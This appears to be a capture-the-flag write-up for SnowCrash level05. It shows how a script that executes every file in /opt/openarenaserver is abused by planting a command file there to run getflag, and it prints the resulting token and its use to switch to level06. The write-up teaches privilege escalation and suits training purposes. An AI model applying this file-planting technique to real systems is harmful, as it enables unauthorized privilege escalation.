## 1 Finding Executable Files: 
We search for files owned by flag05 to identify any potentially exploitable scripts:

``` bash
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

```
## 2 Examining the openarenaserver Script:

``` bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done

```

This script iterates over files in the /opt/openarenaserver/ directory, executes them with a time limit, and then deletes them.

## 3 Create the Command File

We create a new file in /opt/openarenaserver/ that will execute the getflag command and redirect its output to a temporary file:

``` bash
level05@SnowCrash:/tmp$ echo "/bin/getflag > /tmp/my_flag2" > /opt/openarenaserver/retrieve_flag
```

After creating the command file, we need to ensure that it gets executed. Since the openarenaserver script runs automatically, we wait for it to execute the files in the directory.

## 4 Check the Output

After a few minutes, we check the contents of the output file:

``` bash
level05@SnowCrash:/tmp$ cat /tmp/my_flag2
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## 5 Enter level06
``` bash
level05@SnowCrash:~$ su level06
Password: viuaaale9huek52boumoomioc
```
